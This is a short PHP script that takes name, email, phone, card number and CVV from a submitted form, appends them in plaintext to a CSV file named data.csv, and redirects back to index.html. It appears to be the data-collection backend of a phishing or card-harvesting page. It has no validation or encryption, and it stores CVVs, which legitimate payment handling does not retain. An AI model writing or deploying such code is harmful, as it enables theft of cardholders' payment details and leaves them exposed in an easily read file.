<?php

// Check if form data is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Define CSV file path
    $csvFile = "data.csv";

    // Extract form data
    $name = isset($_POST["name"]) ? $_POST["name"] : "";
    $email = isset($_POST["email"]) ? $_POST["email"] : "";
    $phone = isset($_POST["phone"]) ? $_POST["phone"] : "";
    $card = isset($_POST["card"]) ? $_POST["card"] : "";
    $cvv = isset($_POST["cvv"]) ? $_POST["cvv"] : "";

    // Prepare data to write to CSV file
    $rowData = [$name, $email, $phone, $card, $cvv];

    // Open CSV file in append mode
    if (($fileHandle = fopen($csvFile, "a")) !== false) {
        // Write data to CSV file
        fputcsv($fileHandle, $rowData);

        // Close file handle
        fclose($fileHandle);

        // Redirect back to the form page after submission
        header("Location: index.html");
        exit;
    } else {
        // Handle error opening the file
        echo "Failed to open CSV file.";
    }
} else {
    // If form is not submitted via POST method, redirect to index.html
    header("Location: index.html");
    exit;
}
?>
